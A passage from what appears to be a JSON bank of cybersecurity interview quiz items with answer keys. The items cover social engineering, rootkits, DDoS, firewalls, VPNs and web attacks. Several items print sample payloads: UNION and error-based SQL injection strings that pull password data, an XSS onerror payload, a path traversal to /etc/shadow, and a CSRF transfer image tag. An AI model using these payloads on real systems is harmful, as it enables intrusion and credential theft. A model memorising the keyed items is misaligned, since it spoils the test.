    "explanation": "A Logic Bomb is malicious code inserted into software that remains dormant until triggered by a specific condition or event (such as a future calendar date, an employee's account deletion, or a specific system command).",
    "why_other_options_are_wrong": {
      "A": "A Rootkit alters operating system kernel internals to conceal malicious processes and maintain persistent administrative access.",
      "B": "Spyware covertly monitors user behavior and transmits sensitive information to third parties.",
      "C": "Correct: Dormant code set to execute destructive payloads upon meeting a trigger condition is a Logic Bomb.",
      "D": "XSS executes JavaScript in client browsers, not scheduled database destruction in backend code."
    },
    "real_world_application": "Mandating peer code reviews, CI/CD pipeline branch protection rules, and immediate revocation of access upon termination notices."
  },
  {
    "id": 64,
    "question": "An employee at an enterprise finds a shiny USB flash drive in the corporate parking lot labeled 'Q4_Executive_Salaries_and_Bonus_List.xlsx'. Out of curiosity, the employee plugs the USB drive into their work computer and opens the file, silently executing an embedded malicious payload. What social engineering technique did the attacker use?",
    "options": {
      "A": "Whaling",
      "B": "Tailgating / Piggybacking",
      "C": "Vishing",
      "D": "Baiting"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Social Engineering (Baiting)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "HCLTech-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Baiting relies on human curiosity or greed. The attacker leaves malware-infected physical media (like USB drives or external disks) in public or targeted locations (parking lots, cafeterias) with enticing labels, waiting for an employee to plug it in and trigger the payload.",
    "why_other_options_are_wrong": {
      "A": "Whaling is high-level spear phishing targeted at C-suite executives via email.",
      "B": "Tailgating involves physically following an authorized person through a secured badge-access door.",
      "C": "Vishing is voice phishing conducted over telephone calls.",
      "D": "Correct: Leaving physical media with enticing labels to trick victims into running malware is Baiting."
    },
    "real_world_application": "Disabling USB removable mass storage via Active Directory Group Policy (GPO) or endpoint protection software."
  },
  {
    "id": 65,
    "question": "A person wearing delivery uniform and carrying two large, heavy cardboard boxes approaches the badge-restricted entrance of an IT development center. As an authorized software developer badges in, the delivery person smiles and asks: 'Could you hold the door for me? My hands are completely full!' The developer politely holds the door open, allowing the unbadged person to enter the secure facility. What physical security breach occurred?",
    "options": {
      "A": "Tailgating / Piggybacking",
      "B": "Pretexting via Vishing",
      "C": "Dumpster Diving",
      "D": "Shoulder Surfing"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Physical Social Engineering (Tailgating)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Tailgating (or Piggybacking) occurs when an unauthorized individual gains physical access to a restricted facility by closely following an authorized employee through a checkpoint, often exploiting social courtesy or a plausible pretext (like carrying heavy packages).",
    "why_other_options_are_wrong": {
      "A": "Correct: Following an authorized person through a physical access control point is Tailgating.",
      "B": "Vishing is voice phishing conducted over phone systems.",
      "C": "Dumpster diving searches through physical trash bins for discarded documents and passwords.",
      "D": "Shoulder surfing involves watching someone enter their PIN or password over their shoulder."
    },
    "real_world_application": "Installing turnstiles, mantraps (airlocks), and security awareness training instructing staff never to hold doors in secure zones."
  },
  {
    "id": 66,
    "question": "A cybersecurity incident response team discovers malware installed in the ring-0 kernel space of an enterprise domain controller. The malware intercepts Windows operating system API calls (`NtQuerySystemInformation`), making its own processes, network sockets, and file system directories completely invisible to the Windows Task Manager and standard antivirus scanners. What type of malware is this?",
    "options": {
      "A": "Adware",
      "B": "Rootkit",
      "C": "Keylogger",
      "D": "Macro Virus"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "Rootkits & Kernel-level Evasion",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Rootkit is a stealthy collection of software designed to provide continuous privileged access (root/admin) while actively hiding its presence by hooking into the OS kernel, hypervisor, or system APIs to alter output and blind administrative inspection tools.",
    "why_other_options_are_wrong": {
      "A": "Adware serves advertisements and has no kernel-level stealth capabilities.",
      "B": "Correct: Altering kernel API calls to hide processes and files from Task Manager and antivirus defines a Rootkit.",
      "C": "A Keylogger records keystrokes; while some use rootkit techniques, the architectural hiding described defines a rootkit.",
      "D": "Macro viruses run in document application runtimes, completely separated from ring-0 kernel space."
    },
    "real_world_application": "Enforcing UEFI Secure Boot, Driver Signature Enforcement, and hardware-backed virtualization-based security (VBS) in Windows 11."
  },
  {
    "id": 67,
    "question": "An attacker targets an online clothing store. The URL to display product details is: `https://shop.com/product?id=45`. The attacker modifies the URL to: `https://shop.com/product?id=45+UNION+SELECT+null,username,password_hash+FROM+users--`. The web page immediately renders the administrator's username and hashed password on the screen. What subtype of SQL Injection was leveraged?",
    "options": {
      "A": "Time-Based Blind SQL Injection",
      "B": "Boolean-Based Blind SQL Injection",
      "C": "Union-Based SQL Injection",
      "D": "Second-Order SQL Injection"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Union-Based SQL Injection",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Cognizant-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Union-Based SQLi uses the `UNION` SQL operator to combine the results of the original query with the results of a forged query executed against another table (such as `users`), directly displaying the exfiltrated records in the application's HTTP response.",
    "why_other_options_are_wrong": {
      "A": "Time-based blind SQLi forces database delays (e.g. `SLEEP(5)`) to infer data when no visual feedback is returned.",
      "B": "Boolean blind SQLi extracts data bit-by-bit by asking True/False questions without displaying raw results.",
      "C": "Correct: Appending a `UNION SELECT` statement to display additional table contents in the HTTP response is Union-Based SQLi.",
      "D": "Second-order SQLi occurs when injected payload is stored first and executed later in a separate query."
    },
    "real_world_application": "Securing database inputs with parameterized statements and least-privilege database user permissions."
  },
  {
    "id": 68,
    "question": "A web application vulnerability exists where the client's browser renders data directly from the document URL without sending it to the server: `const name = new URLSearchParams(window.location.search).get('name'); document.getElementById('welcome').innerHTML = name;`. If an attacker crafts a link with `?name=<img src=x onerror=alert(1)>`, the script executes purely within the victim's browser client-side. Which specific XSS category is this?",
    "options": {
      "A": "Server-Side Request Forgery",
      "B": "Stored XSS",
      "C": "Reflected Server-Side XSS",
      "D": "DOM-Based XSS"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "DOM-Based XSS",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Deloitte-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "DOM-Based XSS occurs when client-side JavaScript reads data from a controllable 'source' (like `window.location`) and passes it unsafely to an execution 'sink' (like `element.innerHTML` or `eval()`) in the browser's Document Object Model, without the payload necessarily ever being sent to the server.",
    "why_other_options_are_wrong": {
      "A": "SSRF induces the backend server to make network connections to internal systems.",
      "B": "Stored XSS persists in a server-side database.",
      "C": "Reflected server-side XSS involves the server receiving the input and including it in the HTTP response body.",
      "D": "Correct: The vulnerability exists purely within client-side JavaScript reading a source and writing to a sink in the DOM."
    },
    "real_world_application": "Fixing DOM sinks by using safe APIs like `element.textContent = name` instead of `innerHTML`."
  },
  {
    "id": 69,
    "question": "A user connects their smartphone to a free public Wi-Fi access point in an airport named 'Airport_Free_WiFi_Official'. In reality, this hotspot was deployed by an attacker sitting nearby using a portable Wi-Fi Pineapple device designed to mimic the legitimate airport SSID. What type of attack is this?",
    "options": {
      "A": "Evil Twin Attack",
      "B": "Smurf Attack",
      "C": "SYN Flood",
      "D": "SQL Injection"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Wireless Attacks (Evil Twin)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Capgemini-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "An Evil Twin attack is a rogue wireless access point that masquerades as a legitimate, trusted network by broadcasting the exact same SSID (Service Set Identifier), enticing victims into connecting so the attacker can intercept their network traffic.",
    "why_other_options_are_wrong": {
      "A": "Correct: Setting up a rogue Wi-Fi access point that impersonates a legitimate network SSID is an Evil Twin attack.",
      "B": "A Smurf attack is an ICMP-based amplification denial of service attack.",
      "C": "SYN floods exhaust TCP state tables on servers.",
      "D": "SQL injection attacks database query strings on web servers."
    },
    "real_world_application": "Using mobile VPNs on all public untrusted Wi-Fi networks and turning off auto-connect Wi-Fi features on client devices."
  },
  {
    "id": 70,
    "question": "An attacker targets a Domain Name System (DNS) server and injects false IP address mapping records into its local cache. Consequently, when 5,000 employees enter `www.internal-payroll.com`, their browsers resolve to the attacker's IP address rather than the legitimate internal server. What specific attack is this?",
    "options": {
      "A": "SYN Flood Attack",
      "B": "DNS Cache Poisoning (DNS Spoofing)",
      "C": "Cross-Site Scripting",
      "D": "Buffer Overflow"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "DNS Spoofing & Cache Poisoning",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "TCS-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "DNS Cache Poisoning occurs when corrupt or fraudulent DNS data is introduced into a recursive DNS resolver's cache. The resolver returns the incorrect, attacker-controlled IP address to clients, transparently diverting users to malicious destinations.",
    "why_other_options_are_wrong": {
      "A": "SYN floods consume server memory backlogs to cause denial of service.",
      "B": "Correct: Injecting forged IP resolution records into a DNS cache is DNS Cache Poisoning.",
      "C": "XSS executes JavaScript within web browsers.",
      "D": "Buffer overflows overwrite memory addresses in application stacks."
    },
    "real_world_application": "Implementing DNSSEC (Domain Name System Security Extensions) which uses cryptographic signatures to validate DNS records."
  },
  {
    "id": 71,
    "question": "A software engineer creates an application that processes user-uploaded profile avatars. The backend code accepts the filename and executes: `open('/var/www/uploads/' + filename)`. An attacker uploads a file with the name `../../../../etc/shadow`. What vulnerability is the attacker attempting to exploit?",
    "options": {
      "A": "Man-in-the-Middle",
      "B": "Cross-Site Request Forgery",
      "C": "Directory (Path) Traversal",
      "D": "SYN Flood"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Path Traversal Vulnerabilities",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "HCLTech-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Path (or Directory) Traversal exploits insufficient input validation where dot-dot-slash (`../`) sequences are passed to file system APIs, allowing an attacker to escape the restricted root directory and read arbitrary files (such as `/etc/shadow` or config files) from the host operating system.",
    "why_other_options_are_wrong": {
      "A": "MITM intercepts network traffic between two parties.",
      "B": "CSRF forces users to execute state-changing actions on authenticated sites.",
      "C": "Correct: Using `../` to navigate out of the intended directory to access restricted system files is Path Traversal.",
      "D": "SYN floods are Layer 4 TCP availability attacks."
    },
    "real_world_application": "Sanitizing paths with `os.path.basename()` or using language-level canonical path boundary verification."
  },
  {
    "id": 72,
    "question": "An attacker sends a forged UDP request with the spoofed source IP address of a target victim to thousands of misconfigured, publicly accessible NTP (Network Time Protocol) servers. The NTP servers reply with monlist responses that are 556 times larger than the original request, overwhelming the victim's internet connection. What type of DDoS attack is this?",
    "options": {
      "A": "SQL Injection",
      "B": "SYN Flood Attack",
      "C": "Slowloris Attack",
      "D": "Amplification / Reflection Attack"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "DDoS Amplification Attacks",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Deloitte-style",
      "IBM-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Amplification and Reflection DDoS attacks leverage stateless UDP protocols (NTP, DNS, SNMP, Memcached). The attacker spoofs the victim's IP address as the source. Intermediate servers 'reflect' the responses back to the victim, while protocol-specific features 'amplify' the response payload size by factors of 50x to 50,000x, drowning the victim's bandwidth.",
    "why_other_options_are_wrong": {
      "A": "SQL injection attacks database query strings, not network bandwidth saturation.",
      "B": "SYN floods use TCP handshakes and do not provide payload amplification multipliers.",
      "C": "Slowloris keeps HTTP connections open by sending partial headers slowly, consuming server thread pools without high bandwidth.",
      "D": "Correct: Spoofing source IP and leveraging intermediate UDP servers to generate massive response volume is an Amplification/Reflection attack."
    },
    "real_world_application": "BCP 38 (Network Ingress Filtering) preventing ISPs from allowing packets with spoofed source IP addresses onto the internet."
  },
  {
    "id": 73,
    "question": "A web attacker discovers that an authenticated user is logged into their online banking session. The attacker tricks the user into visiting a malicious site containing an invisible image: `<img src='https://bank.com/transfer?amount=5000&to=attacker_account' width='0' height='0'>`. Because the user's browser automatically attaches their valid session cookie to the request, the bank executes the transfer. What attack occurred?",
    "options": {
      "A": "Cross-Site Request Forgery (CSRF)",
      "B": "Cross-Site Scripting (XSS)",
      "C": "SQL Injection",
      "D": "Denial of Service"
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Cross-Site Request Forgery (CSRF)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Accenture-style",
      "TCS-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Cross-Site Request Forgery (CSRF) tricks an authenticated victim into submitting an unauthorized request to a trusted web application. The victim's browser automatically includes active session credentials/cookies, causing the application to execute the command as if authorized by the victim.",
    "why_other_options_are_wrong": {
      "A": "Correct: Inducing an authenticated browser to forge a state-changing HTTP request using ambient session cookies is CSRF.",
      "B": "XSS executes arbitrary JavaScript inside the victim's browser context; CSRF merely triggers an action without executing script.",
      "C": "SQL injection modifies backend database queries via unsanitized input.",
      "D": "The service remains online; money is transferred maliciously, not denied."
    },
    "real_world_application": "Implementing unique, unpredictable Anti-CSRF Synchronizer Tokens and setting `SameSite=Lax` or `Strict` on session cookies."
  },
  {
    "id": 74,
    "question": "What is the primary technical defense implemented by modern web applications to completely eliminate Cross-Site Request Forgery (CSRF) vulnerabilities?",
    "options": {
      "A": "Encoding all database output with Base64",
      "B": "Anti-CSRF Synchronizer Tokens (unique, unpredictable, secret tokens validated on every state-changing POST/PUT request) and SameSite cookie attributes",
      "C": "Disabling TLS encryption on all internal login routes",
      "D": "Replacing all relational SQL databases with NoSQL document stores"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "CSRF Mitigation Strategies",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Infosys-style",
      "Capgemini-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "CSRF is prevented by requiring a unique, cryptographically random Anti-CSRF token included in the form payload or request header. Because an external attacker's site cannot read the token due to the Same-Origin Policy, forged requests lack the valid token and are rejected by the server.",
    "why_other_options_are_wrong": {
      "A": "Base64 encoding output provides no authentication or origin verification.",
      "B": "Correct: Synchronizer tokens and `SameSite` cookie flags ensure only genuine application forms can submit state-changing actions.",
      "C": "Disabling TLS exposes traffic to eavesdropping and Man-in-the-Middle attacks.",
      "D": "NoSQL databases are equally susceptible to forged application requests."
    },
    "real_world_application": "Automatic CSRF protection tokens enabled by default in Spring Security (`_csrf`) and Django (`{% csrf_token %}`)."
  },
  {
    "id": 75,
    "question": "An attacker targets an Apache web server by opening hundreds of HTTP connections and sending HTTP request headers extremely slowly—sending a single new header every 15 seconds (e.g. `X-a: b\\r\\n`), never completing the request. The server keeps all its worker threads open waiting for the requests to finish, exhausting thread pools and crashing for legitimate users. What is this stealthy DoS attack called?",
    "options": {
      "A": "Ping of Death",
      "B": "SYN Flood Attack",
      "C": "Slowloris Attack",
      "D": "SQL Injection"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "Application-Layer DoS (Slowloris)",
    "difficulty": "Hard",
    "question_type": "Conceptual Trap",
    "company_pattern": [
      "Deloitte-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Slowloris is an application-layer DoS attack that operates at minimal bandwidth. It initiates multiple connections and holds them open indefinitely by sending partial HTTP headers at slow intervals. Thread-based web servers (like Apache MPM worker) run out of concurrent connection slots and stop accepting new visitors.",
    "why_other_options_are_wrong": {
      "A": "Ping of Death sends oversized ICMP packets at Layer 3.",
      "B": "SYN floods operate at Layer 4 (TCP) and do not send HTTP application headers.",
      "C": "Correct: Holding connection slots open by trickling partial HTTP headers slowly without completing the request is Slowloris.",
      "D": "SQL injection attacks database queries, not web server thread exhaustion."
    },
    "real_world_application": "Placing Nginx or HAProxy as an event-driven reverse proxy in front of Apache and configuring `client_header_timeout`."
  },
  {
    "id": 76,
    "question": "A fraudster places phone calls to employees at a regional bank, impersonating an internal IT support technician. The caller states: 'We detected malware on your workstation. To prevent your account from being locked, I need you to read aloud the 6-digit passcode that was just texted to your phone.' What specific social engineering variant is this?",
    "options": {
      "A": "Watering Hole Attack",
      "B": "Smishing (SMS Phishing)",
      "C": "Tailgating",
      "D": "Vishing (Voice Phishing)"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Social Engineering (Vishing)",
    "difficulty": "Medium-Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "Wipro-style",
      "Accenture-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Vishing (Voice Phishing) is the fraudulent practice of making phone calls or leaving voice messages purporting to be from reputable companies or internal departments in order to manipulate individuals into revealing personal credentials or one-time passwords.",
    "why_other_options_are_wrong": {
      "A": "Watering hole attacks compromise websites frequented by a target community.",
      "B": "Smishing is phishing conducted exclusively via SMS text messages.",
      "C": "Tailgating is physical intrusion following an employee through a door.",
      "D": "Correct: Conducting fraudulent impersonation over telephone voice calls is Vishing."
    },
    "real_world_application": "Enterprise security training instructing staff that legitimate IT support will NEVER ask for MFA codes or passwords over the phone."
  },
  {
    "id": 77,
    "question": "Which of the following attack scenarios represents a technical exploitation vulnerability rather than a social engineering attack?",
    "options": {
      "A": "A web application fails to validate integer bounds on an array index in a C-based backend service, allowing an attacker to overwrite instruction pointers via a Stack Buffer Overflow.",
      "B": "A user clicks an urgent email link from their 'CEO' and enters their password into a spoofed website.",
      "C": "An employee is persuaded to hold a security door open for an unbadged visitor wearing a fake technician badge.",
      "D": "A receptionist is tricked into revealing the direct phone extension of the CFO during an impromptu friendly phone conversation."
    },
    "correct_answer": "A",
    "topic": "Cyber Attacks",
    "subtopic": "Social Engineering vs Technical Exploitation",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Social engineering targets human psychology (trust, fear, urgency, curiosity) to manipulate people into breaking security procedures. Overwriting instruction pointers in memory due to an unvalidated array index is a purely technical software exploitation vulnerability (Buffer Overflow).",
    "why_other_options_are_wrong": {
      "A": "Correct: A buffer overflow is a purely technical flaw in software code and memory management, requiring no human interaction.",
      "B": "Phishing exploits human deception and urgency.",
      "C": "Tailgating exploits human politeness and social conditioning.",
      "D": "Pretexting exploits human trust and willingness to help over the telephone."
    },
    "real_world_application": "Compiling C/C++ code with stack canaries, ASLR (Address Space Layout Randomization), and DEP/NX memory protection."
  },
  {
    "id": 78,
    "question": "An attacker compromises a legitimate, reputable website frequently visited by aerospace defense contractors (such as a niche aerospace engineering forum). The attacker embeds a zero-day browser exploit on the forum. When defense contractors visit the forum during their lunch break, their work laptops are silently infected. What specific attack strategy is this?",
    "options": {
      "A": "Smurf Attack",
      "B": "Watering Hole Attack",
      "C": "SYN Flood",
      "D": "Brute Force Attack"
    },
    "correct_answer": "B",
    "topic": "Cyber Attacks",
    "subtopic": "Advanced Persistent Threat Tactics (Watering Hole)",
    "difficulty": "Hard",
    "question_type": "Scenario-Based",
    "company_pattern": [
      "IBM-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "In a Watering Hole attack, the attacker identifies websites that a specific target organization or industry frequently visits, infects one or more of those third-party sites with malware, and waits for members of the target group to visit, compromising their systems.",
    "why_other_options_are_wrong": {
      "A": "A Smurf attack is an ICMP network amplification denial of service attack.",
      "B": "Correct: Compromising a trusted third-party website frequented by a specific target demographic is a Watering Hole attack.",
      "C": "SYN floods exhaust connection state queues on web servers.",
      "D": "Brute force attacks systematically guess passwords through trial and error."
    },
    "real_world_application": "Isolating enterprise web browsing using Remote Browser Isolation (RBI) technology for high-risk government and defense staff."
  },
  {
    "id": 79,
    "question": "A security operations analyst examines a Linux server log and identifies the following pattern: thousands of failed SSH authentication attempts from a single external IP address within 5 minutes, each trying different common passwords against the `root` account (`root:admin`, `root:123456`, `root:password`). What is this attack, and what is the most immediate, effective defensive action?",
    "options": {
      "A": "Cross-Site Scripting; mitigate by setting HttpOnly cookies",
      "B": "SQL Injection; mitigate by installing an SSL certificate",
      "C": "Brute Force / Dictionary attack; mitigate by disabling root SSH login (`PermitRootLogin no`) and enforcing SSH key-based authentication with Fail2ban",
      "D": "Smurf attack; mitigate by rebooting the core router"
    },
    "correct_answer": "C",
    "topic": "Cyber Attacks",
    "subtopic": "SSH Brute Force Detection & Hardening",
    "difficulty": "Medium-Hard",
    "question_type": "Log or Event Analysis",
    "company_pattern": [
      "Accenture-style",
      "LTIMindtree-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Systematic attempts to guess credentials over SSH represent an automated dictionary/brute-force attack. The industry standard defense is hardening `/etc/ssh/sshd_config` by disabling root login (`PermitRootLogin no`), disabling password authentication in favor of ed25519 public keys, and using Fail2ban to ban aggressive IPs.",
    "why_other_options_are_wrong": {
      "A": "XSS executes JavaScript in browsers, completely unrelated to remote Linux terminal logins.",
      "B": "SSH operates on port 22 for shell access; SQL injection attacks web databases.",
      "C": "Correct: Automated dictionary guessing against SSH is mitigated by disabling root passwords and using key pairs.",
      "D": "Smurf attacks are Layer 3 ICMP floods, unrelated to SSH authentication logs."
    },
    "real_world_application": "Standard cloud virtual machine (AWS EC2 / Azure VM) provisioning disabling passwords by default in favor of SSH key pairs."
  },
  {
    "id": 80,
    "question": "An attacker injects an SQL payload into an e-commerce search bar: `1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users WHERE id=1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--`. The database throws an error message that explicitly displays the admin password inside the error text: `Duplicate entry 'adminSecretPassword1' for key 'group_key'`. What subtype of SQL Injection is this?",
    "options": {
      "A": "Server-Side Request Forgery",
      "B": "Time-Based Blind SQL Injection",
      "C": "Reflected Cross-Site Scripting",
      "D": "Error-Based SQL Injection"
    },
    "correct_answer": "D",
    "topic": "Cyber Attacks",
    "subtopic": "Error-Based SQL Injection",
    "difficulty": "Hard",
    "question_type": "Log or Event Analysis",
    "company_pattern": [
      "TCS-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "Error-Based SQL Injection intentionally triggers database runtime errors (such as group by duplicates or type conversion errors) formatted so that the database engine includes the results of the attacker's nested query inside the descriptive error message returned to the web browser.",
    "why_other_options_are_wrong": {
      "A": "SSRF induces the server to make unauthorized network requests to internal services.",
      "B": "Time-based blind SQLi is used when the server returns NO error messages or visual feedback whatsoever.",
      "C": "XSS executes script in browsers, while this exploits database query error handling.",
      "D": "Correct: Coaxing the database into outputting sensitive data directly inside user-facing error messages is Error-Based SQLi."
    },
    "real_world_application": "Disabling detailed database error output in production (`display_errors = Off`) and using generic error pages."
  },
  {
    "id": 81,
    "question": "A network engineer needs to configure a security device at the corporate boundary. The device must track whether an incoming TCP packet is part of an existing, legitimate connection initiated by an internal employee or if it is an unsolicited external packet attempting to breach the network. Which type of firewall is required?",
    "options": {
      "A": "Stateful Inspection Firewall",
      "B": "Stateless Packet-Filtering Firewall",
      "C": "Circuit-Level Gateway operating without state tables",
      "D": "Static IP Router"
    },
    "correct_answer": "A",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Stateful vs Stateless Firewalls",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Accenture-style",
      "Cognizant-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Stateful Inspection Firewall maintains an internal State Table tracking active connections (TCP 3-way handshakes, sequence numbers, source/destination ports). When an internal host initiates an outbound request, the state table dynamically permits the corresponding inbound return traffic, while blocking unsolicited incoming connection attempts from the outside.",
    "why_other_options_are_wrong": {
      "A": "Correct: Stateful firewalls maintain connection state tables to automatically track and permit legitimate return traffic.",
      "B": "A Stateless firewall inspects packets in isolation based purely on static header rules, completely unaware of whether a packet belongs to an ongoing session.",
      "C": "Circuit-level gateways operate at Layer 5 and do not perform deep packet inspection; stateful inspection is the specific mechanism.",
      "D": "Static IP routers simply forward packets based on destination IP routing tables without connection tracking."
    },
    "real_world_application": "Configuring stateful firewall rules in Cisco ASA, Check Point, or Linux `iptables` / `nftables` using `ctstate ESTABLISHED,RELATED`."
  },
  {
    "id": 82,
    "question": "An enterprise deploys an Intrusion Detection System (IDS) and an Intrusion Prevention System (IPS). The security director asks: 'If a known remote code execution exploit packet is detected targeting our public web server, how do the responses of the IDS and IPS differ?'",
    "options": {
      "A": "The IDS actively terminates the TCP connection and drops the packet, while the IPS only writes an entry to a log file.",
      "B": "The IDS generates an alert and logs the event (passive), while the IPS sits in-line in the traffic flow and actively drops or blocks the malicious packet in real-time (preventive).",
      "C": "Both devices perform identical actions because 'IDS' and 'IPS' are two marketing terms for the same hardware.",
      "D": "The IDS operates at Layer 7, while the IPS operates only on physical fiber optic cables at Layer 1."
    },
    "correct_answer": "B",
    "topic": "Firewalls & Security Devices",
    "subtopic": "IDS vs IPS Comparison",
    "difficulty": "Medium-Hard",
    "question_type": "Comparison",
    "company_pattern": [
      "TCS-style",
      "Infosys-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "An IDS is a Detective control positioned out-of-band (via a switch SPAN port or network TAP) that monitors traffic copies, generating alerts without disrupting traffic flow. An IPS is a Preventive control placed in-line with network traffic that analyzes packets on-the-fly and automatically drops malicious packets, resets connections, or bans offending IPs.",
    "why_other_options_are_wrong": {
      "A": "This option reverses the roles; IDS is passive detection, while IPS is active prevention.",
      "B": "Correct: IDS alerts/logs out-of-band, whereas IPS operates inline to actively block and drop malicious traffic.",
      "C": "IDS and IPS have fundamentally distinct architectural placements (out-of-band vs in-line) and operational objectives.",
      "D": "Both systems analyze network traffic through Layer 7 application payloads."
    },
    "real_world_application": "Deploying Snort or Suricata in passive detection mode (IDS) versus inline IPS mode (`inline-mode = true`)."
  },
  {
    "id": 83,
    "question": "A multinational corporation has 10,000 employees working remotely from home and public coffee shops. Management mandates that remote staff must have encrypted, authenticated access to internal corporate file shares and ERP systems located in the private corporate data center. Which technology is specifically designed for this purpose?",
    "options": {
      "A": "Network Address Translation (NAT)",
      "B": "Stateless Packet Sniffer",
      "C": "Virtual Private Network (VPN)",
      "D": "Dynamic Host Configuration Protocol (DHCP)"
    },
    "correct_answer": "C",
    "topic": "Firewalls & Security Devices",
    "subtopic": "VPN Architecture & Remote Access",
    "difficulty": "Medium",
    "question_type": "Direct Conceptual",
    "company_pattern": [
      "Capgemini-style",
      "Wipro-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Virtual Private Network (VPN) creates an encrypted, authenticated tunnel across the public internet between a remote client and the corporate gateway. It encapsulates and encrypts all traffic, ensuring confidentiality and integrity over untrusted public networks.",
    "why_other_options_are_wrong": {
      "A": "NAT translates private IPs to public IPs at a router; it provides no encryption or remote user authentication.",
      "B": "Packet sniffers (like Wireshark) capture and inspect packets; they provide no remote access or encryption.",
      "C": "Correct: VPN provides secure, encrypted tunneling for remote workers connecting to internal enterprise subnets.",
      "D": "DHCP dynamically assigns local IP configuration settings on a local LAN."
    },
    "real_world_application": "Deploying enterprise IPsec / OpenVPN / Cisco AnyConnect SSL VPN client solutions for remote workforce access."
  },
  {
    "id": 84,
    "question": "An IT team places a proxy server in front of their internal web servers. The proxy receives all incoming client requests from the public internet, performs SSL/TLS decryption (SSL offloading), checks for malicious payloads, balances traffic across three backend application servers, and hides the real internal IP addresses of the application servers. What specific type of proxy is this?",
    "options": {
      "A": "Forward Proxy",
      "B": "Transparent Client Proxy",
      "C": "Open SOCKS4 Proxy",
      "D": "Reverse Proxy"
    },
    "correct_answer": "D",
    "topic": "Firewalls & Security Devices",
    "subtopic": "Forward vs Reverse Proxy",
    "difficulty": "Medium-Hard",
    "question_type": "Application-Based",
    "company_pattern": [
      "Accenture-style",
      "Deloitte-style"
    ],
    "source_status": "PATTERN-BASED",
    "source": null,
    "explanation": "A Reverse Proxy sits in front of backend web servers, acting on behalf of the servers. It shields the internal servers from direct exposure, terminates SSL/TLS, provides load balancing, and caches content. In contrast, a Forward Proxy sits in front of internal clients to control and filter their outbound internet access.",
    "why_other_options_are_wrong": {
      "A": "A Forward Proxy sits on the client side to protect users and control outbound internet browsing.",
      "B": "A transparent client proxy intercepts outbound client traffic without client configuration.",
      "C": "An Open SOCKS proxy relays arbitrary client traffic without HTTP awareness or server shielding.",
      "D": "Correct: A Reverse Proxy faces the public internet to protect and balance traffic for backend server clusters."
    },
    "real_world_application": "Deploying Nginx, HAProxy, or Cloudflare as a reverse proxy in front of backend microservice clusters."
  },
  {
    "id": 85,
